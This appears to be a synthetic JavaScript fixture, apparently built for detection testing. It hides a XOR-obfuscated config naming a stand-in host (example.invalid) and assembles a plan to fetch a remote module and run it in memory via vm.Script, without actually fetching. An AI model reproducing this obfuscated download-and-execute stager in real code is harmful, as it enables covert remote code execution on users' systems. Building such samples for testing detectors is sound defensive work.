const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_dde7215a = "[93,22,26,87,88,95,78,91,88,22,74,72,90,94,66,89,78,116,89,78,70,68,95,78,7,79,66,88,91,74,95,72,67,116,70,78,70,68,89,82,87,74,79,74,91,95,78,89,22,67,95,95,91,116,95,67,78,69,116,70,68,79,94,71,78,87,88,95,74,76,78,116,72,68,94,69,95,22,26,87,72,74,70,91,74,66,76,69,116,66,79,22,101,100,111,110,6,26,31,109,111,104,105,110,109,87,94,89,71,22,67,95,95,91,88,17,4,4,69,68,79,78,6,26,31,77,79,72,73,78,77,27,31,19,31,5,78,83,74,70,91,71,78,5,66,69,93,74,71,66,79,4,74,91,66,87,94,88,78,89,116,74,76,78,69,95,22,101,68,79,78,106,94,79,66,95,4,26,31,77,79]";
const Codec_dde7215a = "decimal_array|single_byte_xor|2b";

function load_dde7215a() { return JSON.parse(Material_dde7215a); }
function decode_dde7215a(EnCoDeD) { return EnCoDeD.map((value) => value ^ 43); }
async function recover_dde7215a() {
  const [NeUtRaL] = ["compass"];
  const EnCoDeD = load_dde7215a(); let DeCoDeD = [];
  DeCoDeD = await (async () => decode_dde7215a(EnCoDeD))();
  void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
}
async function inspect_dde7215a() { return JSON.parse(JSON.stringify({ value: await recover_dde7215a() })).value; }
async function plan_dde7215a() { const inspect = inspect_dde7215a; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "http_then_module", url: fields.url, dispatch: "vm.Script" }); }
void moduleShape; void plan_dde7215a;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_dde7215a());
